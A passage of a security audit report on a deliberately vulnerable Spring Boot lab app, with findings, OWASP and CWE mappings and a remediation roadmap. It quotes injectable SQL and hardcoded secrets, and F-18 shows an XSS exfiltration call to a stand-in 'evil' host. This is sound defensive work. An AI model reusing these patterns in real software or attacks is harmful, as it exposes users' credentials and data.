**Root Cause:** `TRACE` logging on `org.hibernate.type.descriptor.sql` prints **all JDBC bind parameters**, including plaintext passwords (cf. F-04), emails, and balances, into application logs. The output is captured by any centralised logging system (Splunk, CloudWatch, journald, etc.).

**Exploitation Scenario:** Any operator with read access to the log pipeline can `grep` for `password` and harvest credentials. In a breach scenario, log retention policies often exceed DB-access audit retention, making logs a *worse* credential leak than the database itself.

**Business Impact:** Credentials and PII persist in log stores indefinitely.

**Remediation Outline:** Drop both lines. Use `INFO` or `WARN` for `org.hibernate.SQL`. Mask sensitive fields at the JPA layer (`@JsonIgnore` + a custom user type that masks on log).

---

### 🟡 F-16 — Verbose Error Logging of Full SQL to stdout

| Field | Value |
|---|---|
| **Vulnerability Name** | Sensitive Data Exposure — SQL Dumped to Standard Output |
| **CWE** | CWE-532 |
| **OWASP 2021** | A09:2021 — Security Logging & Monitoring Failures |
| **Severity** | 🟡 Medium |
| **Affected File** | `UserService.java:40, 61` |
| **Confidence** | High |

**Vulnerable Code Snippet (line 40):**
```java
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
System.out.println("[VULNERABILITY] Executing raw SQL: " + sql);
```

**Root Cause:** The fully-built SQL string — including the **plaintext password attempt** (F-04) — is written to `System.out`. In containerised deployments this ends up in `docker logs` / `kubectl logs`, and is typically retained longer than access logs.

**Exploitation Scenario:** Anyone with cluster read access (`kubectl logs`, CloudWatch Logs Insights, journalctl) sees every login attempt, including passwords.

**Business Impact:** Persistent credential leak in operational telemetry.

**Remediation Outline:** Remove the `System.out.println`. Use SLF4J with a masked serializer, and only log at DEBUG in non-prod profiles.

---

### 🟡 F-17 — Frame-Options Disabled (Clickjacking)

| Field | Value |
|---|---|
| **Vulnerability Name** | Clickjacking — `X-Frame-Options` Disabled |
| **CWE** | CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) |
| **OWASP 2021** | A05:2021 — Security Misconfiguration |
| **Severity** | 🟡 Medium |
| **Affected File** | `SecurityConfig.java:39` |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```java
.headers(h -> h.frameOptions(f -> f.disable()));
```

**Root Cause:** The H2 console is an HTML page that needs to be framed for the tool. Disabling frame options globally means *every* page in the app can be iframed, enabling clickjacking against authenticated users.

**Exploitation Scenario:** An attacker hosts a transparent iframe pointing at `/api/transfer` over a fake "Claim your prize" button. A logged-in admin clicks the visible button; the invisible iframe submits a transfer.

**Business Impact:** UI redress attacks; combined with F-06 CSRF-disabled and F-11 transfer-no-auth, a single click can move money.

**Remediation Outline:** Set `frameOptions.sameOrigin()` (or `deny()`) and exempt the H2 console path explicitly.

---

### 🟡 F-18 — Missing HTTP Security Headers (CSP, HSTS, X-Content-Type-Options, Referrer-Policy)

| Field | Value |
|---|---|
| **Vulnerability Name** | Missing Defence-in-Depth HTTP Security Headers |
| **CWE** | CWE-693 (Protection Mechanism Failure) |
| **OWASP 2021** | A05:2021 — Security Misconfiguration |
| **Severity** | 🟡 Medium |
| **Affected File** | `SecurityConfig.java` (no `.headers(...)` hardening) |
| **Confidence** | High |

**Root Cause:** Only `frameOptions` is touched; `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`, and `Permissions-Policy` are not set.

**Exploitation Scenario:** XSS payloads (F-08, F-09) can `fetch('https://evil/…')` and exfiltrate data; without CSP there is no `script-src 'self'` restriction. Without HSTS, downgrade attacks are possible.

**Business Impact:** Mitigates the impact of XSS, MITM, and content-type sniffing when used.

**Remediation Outline:**
```java
.headers(h -> h
    .contentSecurityPolicy(c -> c.policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'"))
    .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(31536000))
    .contentTypeOptions(c -> {})          // X-Content-Type-Options: nosniff
    .referrerPolicy(r -> r.policy(ReferrerPolicy.NO_REFERRER))
    .permissionsPolicy(p -> p.policy("geolocation=(), microphone=()"))
)
```

---

### 🟡 F-19 — No Rate Limiting / Account Lockout on Login

| Field | Value |
|---|---|
| **Vulnerability Name** | Missing Brute-Force / Credential-Stuffing Protection |
| **CWE** | CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-799 (Improper Control of Interaction Frequency) |
| **OWASP 2021** | A07:2021 — Identification & Authentication Failures; A04:2021 |
| **Severity** | 🟡 Medium |
| **Affected File** | `AuthController.login` |
| **Confidence** | High |

**Root Cause:** No Bucket4j / Spring Cloud Gateway rate limit, no captcha, no exponential backoff, no `AuthenticationFailureListener` to mark an account as locked.

**Exploitation Scenario:** Attacker runs Hydra/Patator against `POST /api/login` with a leaked password list at 1000 req/s; combined with F-04 (plaintext) the entire password column is the password list.

**Business Impact:** Account takeover at scale.

**Remediation Outline:** Add `Bucket4j` filter on `/api/login`; track failed attempts per username in Redis with an exponential backoff; consider a CAPTCHA after 3 failures.

---

### 🟡 F-20 — Insufficient Bean Validation on Inputs

| Field | Value |
|---|---|
| **Vulnerability Name** | Missing Input Validation (Bean Validation) |
| **CWE** | CWE-20 (Improper Input Validation) |
| **OWASP 2021** | A04:2021 — Insecure Design |
| **Severity** | 🟡 Medium |
| **Affected Files** | All `@RequestBody` and `@RequestParam` (none use `@Valid`/`@Size`/`@NotBlank`) |
| **Confidence** | Medium |

**Examples:**
- `UserController.search(@RequestParam("q") String q)` — no `@NotBlank`, no `@Size(max=64)`, no regex constraint.
- `AuthController.login(@RequestBody Map<String,String> body)` — deserialises an unconstrained map; can be `null` or missing fields (the `getOrDefault` masks this but doesn't reject).
- `AuthController.transfer(@RequestBody Map<String,Object> body)` — `Number` cast will throw `ClassCastException` → 500 → information disclosure.

**Root Cause:** `pom.xml` does not include `spring-boot-starter-validation` and no controller has `@Valid` annotations.

**Exploitation Scenario:** Send `{"fromId":"abc"}` to `/api/transfer` → 500 Internal Server Error with a stack trace (cf. F-18, F-21) revealing class names, package structure, Spring version.

**Business Impact:** Information disclosure, denial of service (large body payload), corrupted state from arbitrary casts.

**Remediation Outline:** Add `spring-boot-starter-validation`. Create DTOs annotated with `@NotBlank`, `@Size`, `@Pattern`. Return `400 Bad Request` with a sanitised error body.

---

### 🟡 F-21 — Information Disclosure via `/vulnerabilities` Page

| Field | Value |
|---|---|
| **Vulnerability Name** | Information Disclosure — Secrets Rendered in HTML |
| **CWE** | CWE-200, CWE-209 |
| **OWASP 2021** | A05:2021 — Security Misconfiguration; A09:2021 |
| **Severity** | 🟡 Medium |
| **Affected File** | `VulnerabilityController.java:38-39, 65` |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```java
return """
    ...
    <h2>Hardcoded secrets (A02 / A05)</h2>
    <ul>
      <li>API key: %s</li>
      <li>DB password: %s</li>
    </ul>
    ...
    """.formatted(apiKey, dbPassword);
```

**Root Cause:** The page intentionally prints the value of `app.secret.api.key` and `app.secret.db.password` to anonymous HTTP clients. Even in a lab context, this is a self-XSS for any future deployment and a credible leakage vector.

**Exploitation Scenario:** `curl http://localhost:8080/vulnerabilities` returns the secrets in HTML.

**Business Impact:** Direct exposure of every secret managed by `SecretConfig`.

**Remediation Outline:** Remove the endpoint entirely. If a documentation page is required, render it only when an `ADMIN` is authenticated.

---

### 🟡 F-22 — Reliance on Insecure JWT Signing Key (or Insecure Randomness Risk)

| Field | Value |
|---|---|
| **Vulnerability Name** | Hardcoded / Weak JWT Signing Key (predictable signing material) |
| **CWE** | CWE-330 (Use of Insufficiently Random Values), CWE-321 (Use of Hard-coded Cryptographic Key) |
| **OWASP 2021** | A02:2021 — Cryptographic Failures; A08:2021 |
| **Severity** | 🟡 Medium |
| **Affected File** | `application.properties:27` |
| **Confidence** | Medium |

**Vulnerable Configuration:**
```properties
app.secret.jwt.signing.key=this-is-a-hardcoded-jwt-signing-key-for-demo-only
```

**Root Cause:** A short, dictionary-word, hardcoded HMAC secret. If the application later uses this key to sign JWTs, an attacker can forge tokens by knowing the secret (the secret is in the repo, on the `/vulnerabilities` page, etc.).

**Exploitation Scenario:** A future JWT filter using `HS256` with this secret can be defeated by the attacker. Even with a proper filter, the secret is recoverable from the build artefact.

**Business Impact:** Token forgery → full account takeover when JWT-based auth is added.

**Remediation Outline:** Generate a 256-bit random key per environment, store in Vault, rotate quarterly.

---

### 🟡 F-23 — Outdated / Unmanaged Dependency Versions

| Field | Value |
|---|---|
| **Vulnerability Name** | No Software Composition Analysis; No OWASP Dependency-Check |
| **CWE** | CWE-1104 (Use of Unmaintained Third Party Components), CWE-937 (OWASP Top 10 2013 Category A9) |
| **OWASP 2021** | A06:2021 — Vulnerable & Outdated Components |
| **Severity** | 🟡 Medium |
| **Affected File** | `pom.xml` (no SCA plugin declared) |
| **Confidence** | Medium |

**Root Cause:** The project pins `spring-boot-starter-parent` 3.2.5 (released Apr 2024) but does not declare `org.owasp:dependency-check-maven` or any other SCA tool. Spring Boot 3.2.x is now in maintenance mode; 3.3.x / 3.4.x are current. Notable CVEs in the dependency surface that should be tracked include historical H2 console JNDI issues and Spring Security advisories.

**Exploitation Scenario:** Any CVE disclosed after the last manual review is shipped silently.

**Business Impact:** Untracked vulnerability surface.

**Remediation Outline:**
```xml
<plugin>
  <groupId>org.owasp</groupId>
  <artifactId>dependency-check-maven</artifactId>
  <version>9.2.0</version>
  <configuration><failBuildOnCVSS>7</failBuildOnCVSS></configuration>
  <executions><execution><goals><goal>check</goal></goals></execution></executions>
</plugin>
```
Add `maven-enforcer-plugin` to require minimum versions, and integrate `renovate-bot` or Dependabot for PRs.

---

### 🔵 F-24 — No Transport Security Enforcement (HTTP only)

| Field | Value |
|---|---|
| **Vulnerability Name** | Cleartext HTTP — No TLS / HSTS |
| **CWE** | CWE-319 (Cleartext Transmission of Sensitive Information) |
| **OWASP 2021** | A02:2021 — Cryptographic Failures; A05:2021 |
| **Severity** | 🔵 Low |
| **Affected File** | `application.properties` (no `server.ssl.*`) |
| **Confidence** | Medium |

**Root Cause:** No `server.ssl.*` properties, no redirect-to-HTTPS filter, no HSTS header. The default Spring Boot port (8080) serves cleartext HTTP.

**Exploitation Scenario:** On any non-loopback network (lab Wi-Fi, transit), an attacker on the path can read the login request body — which contains the plaintext password (F-04).

**Business Impact:** Credential disclosure in transit.

**Remediation Outline:** Provision a TLS certificate (Let's Encrypt) and configure `server.ssl.*`; or terminate TLS at a reverse proxy (nginx, ALB) and set HSTS.

---

### 🔵 F-25 — Self-archived build artefact in working tree (informational)

| Field | Value |
|---|---|
| **Vulnerability Name** | Build artefact shipped in source directory (`.gitignore` covers it) |
| **CWE** | CWE-547 |
| **OWASP 2021** | A05:2021 |
| **Severity** | 🔵 Low / Informational |
| **Affected File** | `target/vulnerable-spring-app-1.0.0.jar` |
| **Confidence** | Low |

**Root Cause:** The 48 MB fat jar contains compiled classes for vulnerable code; if the `target/` directory is committed by mistake, every secret and code path is "in the repo" via the artefact even if the source `.properties` is fixed. The current `.gitignore` excludes `target/`, which is correct.

**Exploitation Scenario:** Accidental `git add target/`.

**Remediation Outline:** Add a pre-commit hook that fails if any `target/` is staged.

---

## 4. OWASP Top 10 (2021) Mapping

| OWASP Category | Findings | Severity Distribution |
|---|---|---|
| **A01:2021 — Broken Access Control** | F-06, F-07, F-10, F-11, F-13, F-14 | 🔴×0 🟠×5 🟡×0 🔵×0 |
| **A02:2021 — Cryptographic Failures** | F-04, F-05, F-12, F-22, F-24 | 🔴×2 🟠×1 🟡×1 🔵×1 |
| **A03:2021 — Injection (SQLi + XSS)** | F-01, F-02, F-08, F-09 | 🔴×2 🟠×2 🟡×0 🔵×0 |
| **A04:2021 — Insecure Design** | F-11 (also A01), F-14 (also A01), F-19, F-20 | 🔴×0 🟠×1 🟡×2 🔵×0 |
| **A05:2021 — Security Misconfiguration** | F-05, F-06, F-13, F-17, F-18, F-21, F-24, F-25 | 🔴×1 🟠×2 🟡×3 🔵×2 |
| **A06:2021 — Vulnerable & Outdated Components** | F-23 | 🟡×1 |
| **A07:2021 — Identification & Authentication Failures** | F-02 (also A03), F-04 (also A02), F-12 (also A02), F-19 | 🔴×1 🟠×1 🟡×1 🔵×0 |
| **A08:2021 — Software & Data Integrity Failures** | F-03, F-22 | 🔴×1 🟡×1 |
| **A09:2021 — Security Logging & Monitoring Failures** | F-12, F-15, F-16, F-21 | 🟠×1 🟡×3 |
| **A10:2021 — Server-Side Request Forgery (SSRF)** | Not observed | — |

> Categories deliberately listed without a "Findings" count are not observed in the source.

---

## 5. CWE Mapping

| CWE | Name | Findings | Count |
|---|---|---|---|
| **CWE-20** | Improper Input Validation | F-20 | 1 |
| **CWE-79** | Improper Neutralisation of Input During Web Page Generation (XSS) | F-08, F-09 | 2 |
| **CWE-89** | Improper Neutralisation of Special Elements used in an SQL Command (SQLi) | F-01, F-02 | 2 |
| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor | F-12, F-13, F-21 | 3 |
| **CWE-209** | Generation of Error Message Containing Sensitive Information | F-21 | 1 |
| **CWE-256** | Plaintext Storage of a Password | F-04, F-12 | 2 |
| **CWE-257** | Storing Passwords in a Recoverable Format | F-04 | 1 |
| **CWE-284** | Improper Access Control | F-07, F-13 | 2 |
| **CWE-287** | Improper Authentication | F-02 | 1 |
| **CWE-307** | Improper Restriction of Excessive Authentication Attempts | F-19 | 1 |
| **CWE-319** | Cleartext Transmission of Sensitive Information | F-24 | 1 |
| **CWE-321** | Use of Hard-coded Cryptographic Key | F-22 | 1 |
| **CWE-330** | Use of Insufficiently Random Values | F-22 | 1 |
| **CWE-352** | Cross-Site Request Forgery (CSRF) | F-06 | 1 |
| **CWE-502** | Deserialisation of Untrusted Data | F-03 | 1 |
| **CWE-532** | Insertion of Sensitive Information into Log File | F-15, F-16 | 2 |
| **CWE-547** | Use of Hard-coded, Security-relevant Constants | F-05, F-25 | 2 |
| **CWE-639** | Authorisation Bypass Through User-Controlled Key (IDOR) | F-10, F-11 | 2 |
| **CWE-693** | Protection Mechanism Failure (Missing Headers) | F-18 | 1 |
| **CWE-798** | Use of Hard-coded Credentials | F-05 | 1 |
| **CWE-799** | Improper Control of Interaction Frequency | F-19 | 1 |
| **CWE-862** | Missing Authorization | F-07, F-11 | 2 |
| **CWE-915** | Improperly Controlled Modification of Dynamically-Determined Object Attributes (Mass Assignment) | F-14 | 1 |
| **CWE-937** | OWASP Top 10 2013 Category A9 (Components with Known Vulnerabilities) | F-23 | 1 |
| **CWE-1021** | Improper Restriction of Rendered UI Layers or Frames (Clickjacking) | F-17 | 1 |
| **CWE-1104** | Use of Unmaintained Third Party Components | F-23 | 1 |

---

## 6. Priority Remediation Roadmap

The roadmap is sequenced by **risk reduction per unit of effort** — fixing items at the top of each sprint blocks the largest attack surface in the least time.

### 🚨 Sprint 0 — Stop the bleeding (1–2 days, on-call)

| # | Action | Files | Eliminates |
|---|--------|-------|-----------|
| 1 | **Delete the `/api/deserialize` endpoint entirely.** No production need. | `InsecureDeserializationController.java` | F-03 (RCE) |
| 2 | **Set `spring.h2.console.enabled=false` in `application.properties`.** | `application.properties` | F-13 |
| 3 | **Delete the `/vulnerabilities` endpoint** (or guard it behind `@PreAuthorize("hasRole('ADMIN')")`). | `VulnerabilityController.java` | F-21 |
| 4 | **Remove `password` from the login response and from `User` JSON serialisation** (`@JsonProperty(WRITE_ONLY)`). | `AuthController.java:48-49`, `User.java:48` | F-12, halves F-04 impact |
| 5 | **Drop `org.hibernate.SQL` TRACE logging.** | `application.properties:36-37` | F-15 |

### 🛠 Sprint 1 — Authentication, Authorisation, Input (1 week)

| # | Action | Files | Eliminates |
|---|--------|-------|-----------|
| 6 | Replace both `String`-concatenated native queries with parameterised JPA queries. | `UserService.java:39, 59-60` | F-01, F-02 |
| 7 | Introduce Spring Security: form login + `BCryptPasswordEncoder`; require auth on all endpoints except `/api/login`, `/api/register`, `/vulnerabilities`. | `SecurityConfig.java` (rewrite) | F-06, F-07 |
| 8 | Hash all passwords on write (`AuthController.register`, `DataSeeder`). Migrate seed users to bcrypt-hashed values. | `AuthController.java:60-68`, `DataSeeder.java:26-28`, `User.java:26` | F-04 |
| 9 | Add `@Valid` + `@NotBlank`/`@Size`/`@Pattern` to all `@RequestBody`/`@RequestParam`; add `spring-boot-starter-validation`. | All controllers, `pom.xml` | F-20 |
| 10 | Replace `permitAll()` with explicit URL matchers. | `SecurityConfig.java:30` | F-07 |
| 11 | Enforce `@PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")` on `/api/profile/{id}` and `/api/transfer`. Derive `fromId` from the principal. | `UserController.java:39`, `AuthController.java:76` | F-10, F-11 |
| 12 | Hardcode `role = "USER"` in `register`; remove `role` from the request DTO. | `AuthController.java:60-68` | F-14 |

### 🔐 Sprint 2 — Defence in depth (1 week)

| # | Action | Files | Eliminates |
|---|--------|-------|-----------|
| 13 | Move all secrets to environment variables / Vault; inject via `${ENV_VAR}` placeholders. | `application.properties:25-27`, `SecretConfig.java` | F-05 |
| 14 | Add `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`. | `SecurityConfig.java` | F-18 |
| 15 | Enable CSRF for cookie flows; use `CookieCsrfTokenRepository.withHttpOnlyFalse()` for SPAs. | `SecurityConfig.java:27` | F-06 |
| 16 | Replace `frameOptions.disable()` with `sameOrigin()`; configure CSP `frame-ancestors 'none'`. | `SecurityConfig.java:39` | F-17 |
| 17 | Add login rate-limiting (Bucket4j) and account lockout (Redis). | `AuthController.login` | F-19 |
| 18 | Remove `System.out.println` SQL dumps; add SLF4J structured logging. | `UserService.java:40, 61` | F-16 |
| 19 | Add a `UserResponse` DTO; never return `User` entities over the wire. | new `dto/UserResponse.java` | F-04, F-10, F-12 |
| 20 | Encode XSS sinks with `org.owasp.encoder.Encoder.forHtml(...)` *or* migrate to Thymeleaf. | `CommentController.java:51`, `CommentViewController.java:36-40, 53-54` | F-08, F-09 |

### 📈 Sprint 3 — Supply chain & ops hygiene (1 week)

| # | Action | Files | Eliminates |
|---|--------|-------|-----------|
| 21 | Add `owasp-dependency-check-maven` plugin; fail build on CVSS ≥ 7. | `pom.xml` | F-23 |
| 22 | Add `renovate.json` / Dependabot config; pin to the latest Spring Boot 3.4.x. | new `.github/dependabot.yml` | F-23 |
| 23 | Provision TLS; add `server.ssl.*` or terminate at reverse proxy; enable HSTS preload. | `application.properties`, infra | F-24 |
| 24 | Add `maven-enforcer-plugin` to ban `permitAll()` and to require `@PreAuthorize` on `@RestController` methods. | `pom.xml` | regression guard for F-07 |
| 25 | Add `gitleaks` / `trufflehog` pre-commit hook. | `.pre-commit-config.yaml` | regression guard for F-05 |

### 🧪 Sprint 4 — Validation (ongoing)

- Static: **SpotBugs** + **Semgrep** (Spring Boot ruleset) in CI; fail build on `HIGH` findings.
- Dependency: **OWASP Dependency-Check** (Sprint 3.21) and **Snyk** for transitive CVEs.
- Dynamic: **OWASP ZAP** baseline scan against the running container in CI.
- Unit/integration: Add **Spring Security Test** cases covering `permitAll()` removal (F-07), CSRF (F-06), and `@PreAuthorize` (F-10/F-11).
- Manual: Threat-model `/api/transfer` with STRIDE; document the trust boundaries in a `/docs/threat-model.md`.

---

## 7. Appendix — Tooling Notes

| Tool | Use | Status in repo |
|---|---|---|
| `mvn` build | Compile + package | ✅ passes (cosmetic only — does not catch any of the 24 findings) |
| `spring-boot-starter-validation` | Bean Validation | ❌ missing from `pom.xml` |
| `owasp-dependency-check-maven` | SCA | ❌ missing |
| `maven-enforcer-plugin` | Build-time constraints | ❌ missing |
| Semgrep / SpotBugs | SAST | ❌ missing |
| gitleaks / trufflehog | Secret scanning | ❌ missing |
| Spring Security Test | AuthZ unit tests | ❌ missing (no test sources at all) |

The clean `mvn clean package` outcome is **not** evidence of security; it is evidence of compilability. Every finding in this report would survive a `mvn install` without warning.

---

## 8. Reviewer's Closing Note

> This codebase is explicitly framed as an *OWASP vulnerability learning lab*. As a senior security engineer, I have reviewed it as if it were a production system and produced a full-priority remediation roadmap. In its declared educational role, the most valuable follow-up work is not "patch" but **"lab exercise"** — for each finding above, add a paired `fixed` branch that introduces the remediation, so a learner can diff vulnerable vs. secure side-by-side and rehearse the recognition → exploitation → remediation loop. The 24 findings map cleanly to a 12-session curriculum.
>
> — *Senior Application Security Engineer, Secure Code Reviewer, OWASP Top 10 Expert, Java Spring Boot Security Specialist*
